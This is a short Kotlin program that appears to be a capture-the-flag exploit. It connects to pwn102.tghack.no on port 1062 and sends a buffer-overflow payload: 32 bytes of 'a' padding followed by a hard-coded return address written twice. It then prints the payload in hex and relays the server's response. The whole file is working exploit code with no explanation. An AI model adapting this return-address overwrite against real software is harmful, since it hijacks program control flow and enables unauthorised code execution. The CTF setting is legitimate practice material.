import java.io.*
import java.net.Socket

fun main(args: Array<String>) {
    Socket("pwn102.tghack.no", 1062).use {
        pwn(it.getInputStream(), it.getOutputStream())
    }
}

fun pwn(input: InputStream, output: OutputStream) {
    val returnAddress = arrayOf(0xB0, 0x84, 0x04, 0x08)

    val byteArrayOutput = ByteArrayOutputStream()
    val dataOut = DataOutputStream(byteArrayOutput)

    dataOut.write(buildStr(31).toByteArray(Charsets.ISO_8859_1))
    returnAddress.forEach { dataOut.write(it) }
    returnAddress.forEach { dataOut.write(it) }
    output.write(byteArrayOutput.toByteArray())
    output.flush()

    println(byteArrayOutput.toByteArray().joinToString("") { String.format("%02X", it) })
    BufferedReader(InputStreamReader(input)).lines().forEach(System.out::println)
}

fun buildStr(len: Int): String = (0..len).joinToString("") { "a" }